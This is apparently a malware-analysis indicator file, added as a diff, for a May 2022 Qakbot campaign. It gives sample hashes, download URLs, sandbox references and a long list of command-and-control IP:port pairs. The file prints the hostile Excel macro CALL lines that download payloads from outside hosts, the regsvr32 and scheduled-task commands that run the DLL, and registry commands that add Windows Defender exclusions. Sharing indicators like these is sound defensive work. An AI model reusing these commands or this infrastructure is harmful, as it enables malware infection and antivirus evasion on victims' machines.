@@ -1,0 +1,226 @@
+04.05.2022 | Qakbot | AA | Version 403.573 | Campaign | 1651213569
+
+******************************
+
+.xls 9d41bc2f5adca72ba0f261bfd3c9fd77d40a94e2f1ef7b083137435986da0d93
+.dll bbce623c5860160100744a5403421fd6bd9852923702a56ac2363ddf665853ad 
+
+******************************
+
+=CALL("Kernel32", "CreateDirectoryA", "CJ", "C:\Users\Public\Documents\thntpi", 0)
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://souq-in.com/12cb11N6/fnh.png", "C:\Users\Public\Documents\btmwidbbh.cab")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://medluminous.com/1PSm1BI3PAJr/fnh.png", "C:\Users\Public\Documents\anuvbrwlm.cab")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://yqsigo.com/4xU1mMFW/fnh.png", "C:\Users\Public\Documents\jgtdmaxkw.cab")
+
+https://souq-in.com/12cb11N6/fnh.png
+https://medluminous.com/1PSm1BI3PAJr/fnh.png
+https://yqsigo.com/4xU1mMFW/fnh.png
+
+*************************************************
+
+Exec >>
+
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\f_1888021764.xlsb
+
+Expand -R C:\Users\Public\Documents\eajbyuaap.cab -F:PeJl8.dll C:\Users\Public\Documents\fafrpx
+
+Expand -R C:\Users\Public\Documents\zjtruqsre.cab -F:PeJl8.dll C:\Users\Public\Documents\fafrpx
+
+Expand -R C:\Users\Public\Documents\kyigpvwei.cab -F:PeJl8.dll C:\Users\Public\Documents\fafrpx
+
+regsvr32 -silent C:\Users\Public\Documents\fafrpx\PeJl8.dll
+
+regsvr32 -silent C:\Users\Public\Documents\fafrpx\PeJl8.dll
+
+regsvr32 -silent C:\Users\Public\Documents\fafrpx\PeJl8.dll
+
+regsvr32 /s C:\Users\Admin\AppData\Local\Temp\PeJl8.dll
+
+explorer.exe
+
+schtasks.exe" /Create /RU "NT AUTHORITY\SYSTEM" /tn aiigeccie /tr "regsvr32.exe -s \"C:\Users\Admin\AppData\Local\Temp\PeJl8.dll\"" /SC ONCE /Z /ST 01:43 /ET 01:55
+
+regsvr32.exe -s C:\Users\Admin\AppData\Local\Temp\PeJl8.dll
+
+C:\Windows\SysWOW64\explorer.exe
+
+reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /f /t REG_DWORD /v "C:\ProgramData\Microsoft\Folrbm" /d "0"
+
+reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /f /t REG_DWORD /v "C:\Users\Admin\AppData\Roaming\Microsoft\Ruzynyposhmu" /d "0"
+
+*************************************************
+
+https://tria.ge/220504-1tw69segb7/behavioral2
+
+*************************************************
+
+Additonal AA Run ++ 
+
+https://sandeepkhandal.com/oteu/unaagemiqe
+https://amobladoscopiapo.cl/aue/dmsooirnul
+https://enviaseo.gov.co/liad/uqsiiasp
+
+https://srisoukya.com/TWwOQPk48GK/Nhfnbww.png
+https://bubblesprintsandgifts.com/VjMT7RFsv/Nhfnbww.png
+https://dody-store.com/Vlea1s0M/Nhfnbww.png
+
+C:\Hentrio\Nuarost\Nuatbense.ooocccxxx
+C:\Hentrio\Nuarost\Nuatbensea.ooocccxxx
+C:\Hentrio\Nuarost\Nuatbenseb.ooocccxxx
+
+C:\Uetrio\Kiarost\Miense.OOOOCCCXXX
+C:\Uetrio\Kiarost\Miensea.OOOOCCCXXX
+C:\Uetrio\Kiarost\Mienseb.OOOOCCCXXX
+
+ID: AA
+
+194.36.28.102:443
+32.221.224.140:995
+100.1.108.246:443
+24.139.72.117:443
+24.55.67.176:443
+24.152.219.253:995
+203.122.46.130:443
+47.23.89.62:993
+140.82.49.12:443
+38.70.253.226:2222
+75.99.168.194:443
+41.228.22.180:443
+148.64.96.100:443
+2.50.4.57:443
+67.209.195.198:443
+187.207.47.198:61202
+86.132.13.91:2078
+41.215.148.115:995
+217.128.122.65:2222
+187.102.135.141:2222
+46.107.48.202:443
+103.139.243.207:990
+217.118.46.41:2222
+76.70.9.169:2222
+183.82.103.213:443
+2.34.12.8:443
+149.135.101.20:443
+92.132.172.197:2222
+75.99.168.194:61201
+72.76.94.99:443
+89.101.97.139:443
+117.248.109.38:21
+103.87.95.133:2222
+94.36.195.102:2222
+63.143.92.99:995
+196.203.37.215:80
+93.48.80.198:995
+86.195.158.178:2222
+31.35.28.29:443
+173.174.216.62:443
+149.28.238.199:443
+149.28.238.199:995
+45.63.1.12:443
+45.63.1.12:995
+144.202.2.175:995
+140.82.63.183:995
+140.82.63.183:443
+45.76.167.26:443
+144.202.3.39:443
+45.76.167.26:995
+144.202.3.39:995
+144.202.2.175:443
+1.161.93.172:443
+103.107.113.120:443
+89.86.33.217:443
+24.178.196.158:2222
+91.177.173.10:995
+37.186.54.254:995
+176.67.56.94:443
+120.150.218.241:995
+148.0.57.85:443
+86.98.208.214:2222
+186.64.67.8:443
+179.179.162.9:993
+70.46.220.114:443
+37.34.253.233:443
+96.37.113.36:993
+108.60.213.141:443
+142.184.161.168:2222
+103.233.141.208:2222
+74.14.7.71:2222
+39.33.170.57:995
+172.115.177.204:2222
+80.11.74.81:2222
+90.120.65.153:2078
+177.102.2.175:32101
+141.237.86.114:995
+197.89.8.185:443
+41.107.129.121:443
+1.161.93.172:995
+208.107.221.224:443
+58.105.167.36:50000
+73.151.236.31:443
+121.74.167.191:995
+174.69.215.101:443
+173.21.10.71:2222
+189.146.78.175:443
+76.25.142.196:443
+191.99.191.28:443
+67.165.206.193:993
+45.46.53.140:2222
+47.156.191.217:443
+104.34.212.7:32103
+190.252.242.69:443
+187.208.0.99:443
+40.134.246.185:995
+72.252.157.172:990
+190.36.233.41:2222
+70.51.152.61:2222
+72.252.157.172:995
+181.208.248.227:443
+68.204.7.158:443
+179.158.105.44:443
+201.142.133.198:443
+197.94.84.67:443
+109.12.111.14:443
+201.172.23.68:2222
+79.129.121.68:995
+106.51.48.170:50001
+72.66.116.235:995
+82.152.39.39:443
+72.12.115.78:22
+103.139.243.207:993
+193.136.1.58:443
+89.137.52.44:443
+103.246.242.202:443
+69.14.172.24:443
+109.177.97.4:2222
+191.34.199.46:443
+120.61.0.220:443
+180.129.20.164:995
+98.50.191.202:443
+96.45.66.216:61202
+102.182.232.3:995
+37.210.160.58:2222
+5.32.41.45:443
+84.241.8.23:32103
+172.114.160.81:995
+217.164.117.87:1194
+45.9.20.200:443
+47.23.89.62:995
+187.172.191.97:443
+24.43.99.75:443
+103.88.226.30:443
+182.191.92.203:995
+39.44.144.64:995
+45.241.254.110:993
+39.57.56.19:995
+121.7.223.59:2222
+94.140.8.55:2222
+172.114.160.81:443
+2.191.231.178:443
+39.49.69.112:995
+102.222.180.38:443
+118.172.250.162:443
+103.116.178.85:995
+175.145.235.37:443
+83.79.89.141:2222
+83.110.218.155:993
+120.239.138.99:995
